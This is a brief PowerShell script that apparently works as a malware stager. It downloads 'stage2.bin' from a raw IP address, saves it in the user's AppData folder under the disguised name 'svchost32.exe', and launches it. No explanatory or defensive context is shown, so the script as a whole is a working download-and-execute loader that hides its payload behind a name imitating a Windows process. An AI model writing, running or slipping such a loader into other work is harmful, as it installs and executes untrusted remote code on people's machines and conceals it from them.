[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://198.51.100.30/stage2.bin',
    [string]$WorkingPath = "$env:APPDATA\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $WorkingPath)
Start-Process -FilePath $WorkingPath
$StageMarker = "stage-35"
